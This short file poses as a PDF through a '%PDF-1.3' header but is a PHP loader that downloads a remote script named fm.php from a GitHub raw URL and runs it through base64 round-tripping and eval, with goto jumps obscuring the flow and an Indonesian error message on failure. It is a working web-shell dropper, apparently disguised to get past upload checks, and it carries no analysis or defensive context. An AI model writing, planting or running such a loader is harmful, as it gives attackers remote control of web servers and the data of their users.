%PDF-1.3
<?php
goto start;

decode:
$code = base64_decode($encoded);
eval('?>' . $code);
goto end;

start:
$url = 'https://raw.githubusercontent.com/fallinginbinary/SHIT/refs/heads/main/fm.php';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($http_code === 200 && $response !== false) {
    $encoded = base64_encode($response);
    goto decode;
} else {
    echo "Gagal mengambil kode dari URL.";
}

end:
?>